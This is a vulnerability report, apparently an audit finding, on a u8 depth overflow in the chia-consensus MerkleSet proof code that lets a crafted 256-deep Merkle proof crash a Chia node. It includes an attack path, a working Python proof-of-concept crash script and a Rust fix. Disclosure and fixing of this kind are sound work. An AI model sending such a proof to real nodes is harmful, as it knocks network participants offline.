# [HIGH] Denial of Service via Integer Overflow in MerkleSet Proof Generation

## Vulnerable Code
`crates/chia-consensus/src/merkle_tree.rs:222` — `generate_proof_impl()`
`crates/chia-consensus/src/merkle_tree.rs:306` — `pad_middles_for_proof_gen()`
`crates/chia-consensus/src/merkle_tree.rs:421` — `generate_merkle_tree_recurse()`

## Root Cause
The `depth` parameter in several recursive functions within the `MerkleSet` implementation is of type `u8`. While the code explicitly allows tree construction up to a depth of 256, incrementing the `depth` beyond 255 (i.e., `depth + 1`) results in an integer overflow, triggering a Rust panic in debug builds and unexpected behavior in release builds (though still crashing due to the panic in the default configuration of `chia_rs`).

## Attack Path
1. An attacker crafts a malicious Merkle proof that represents a tree with a branch of depth 256.
2. The attacker calls a public API that validates this proof, such as `chia_rs.confirm_included_already_hashed()`.
3. The code reaches `generate_proof_impl` in `merkle_tree.rs`.
4. When processing the 256th level of the tree, `depth` is 255. The code attempts to call `self.generate_proof_impl(..., depth + 1)`, which overflows the `u8` and panics.
5. Result: The entire Chia node or process using the library crashes, leading to a Denial of Service.

## PoC
The following Python script reproduces the crash:
```python
import chia_rs
import hashlib

def hash_node(ltype, rtype, left, right):
    h = hashlib.sha256()
    h.update(bytes([0] * 30))
    h.update(bytes([ltype, rtype]))
    h.update(left)
    h.update(right)
    return h.digest()

EMPTY = 0
TERMINAL = 1
MIDDLE = 2
BLANK = bytes([0] * 32)

proof = bytearray([MIDDLE] * 256 + [TERMINAL] + [0] * 32 + [EMPTY] * 256)
curr_hash = hash_node(TERMINAL, EMPTY, BLANK, BLANK)
for _ in range(255):
    curr_hash = hash_node(MIDDLE, EMPTY, curr_hash, BLANK)

item = bytes([0] * 32)
try:
    chia_rs.confirm_included_already_hashed(curr_hash, item, bytes(proof))
except Exception as e:
    print(f"Panic triggered: {e}")
```

## Impact
This is a high-severity Denial of Service vulnerability. Merkle proofs are often received from untrusted peers in the Chia network. An unauthenticated remote attacker can send a malicious proof to a Chia node, causing it to panic and terminate immediately.

## Fix
Change the `depth` parameter from `u8` to `u32` across the affected functions and use saturating arithmetic for increments. Additionally, update `get_bit` to handle bit indices safely.

```rust
fn get_bit(val: &[u8; 32], bit: u32) -> bool {
    if bit >= 256 {
        return false;
    }
    (val[(bit / 8) as usize] & (0x80 >> (bit & 7))) != 0
}

fn generate_proof_impl(
    &self,
    current_node_index: usize,
    leaf: &[u8; 32],
    proof: &mut Vec<u8>,
    depth: u32,
) -> Result<bool, SetError> {
    // ...
    self.generate_proof_impl(..., depth.saturating_add(1))
    // ...
}
```

## Status
CONFIRMED
